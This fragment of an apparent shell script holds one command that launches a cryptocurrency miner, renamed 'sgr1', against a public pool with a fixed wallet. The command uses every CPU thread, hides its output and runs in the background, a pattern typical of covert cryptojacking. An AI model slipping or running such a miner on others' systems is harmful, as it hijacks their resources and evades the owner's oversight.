...
./sgr1 --algorithm ghostrider --pool stratum-asia.rplant.xyz:17084 --wallet SNWaFAPwqiKuKHBirrJxDBf42G4AzynUto.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
